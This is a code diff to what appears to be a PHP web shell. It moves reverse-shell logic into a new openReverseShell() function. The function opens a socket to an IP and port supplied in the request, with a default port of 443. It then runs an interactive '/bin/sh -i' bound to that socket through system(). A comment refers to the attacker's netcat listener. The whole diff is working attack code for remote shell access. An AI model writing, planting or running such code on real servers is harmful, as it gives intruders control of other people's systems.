@@ -53,13 +53,11 @@ if (isset($_REQUEST[$cmd])) {
       ? $_REQUEST[$port]
       : '443';
 
-   // nc -nlvp $port
-   $sock    = fsockopen($_REQUEST[$ip], $port);
-   $command = '/bin/sh -i <&3 >&3 2>&3';
+   $ret = openReverseShell($_REQUEST[$ip], $port);
 
-   // notify on execution failure
-   if (!executeCommand($command)) {
-      echo 'The command failed to run';
+   if ($ret) {
+      echo "\e[0;31mError reverse shell setup\e[0m: ${ret}\n";
+   }
    }
 }
 
@@ -110,6 +108,22 @@ function executeCommand(string $command)
       // http://php.net/manual/en/function.system.php
       system($command);
       return true;
+   }
+
+   return false;
+}
+
+function openReverseShell(string $ip, string $port) {
+   $command = '/bin/sh -i <&3 >&3 2>&3';
+   $socket  = fsockopen($ip, $port, $errcode, $errmsg);
+
+   if (!$socket) {
+      return "Could not open socket for $ip:$port: $errmsg";
+   }
+
+   // notify on execution failure
+   if (!executeCommand($command)) {
+      return 'The command failed to run';
    }
 
    return false;
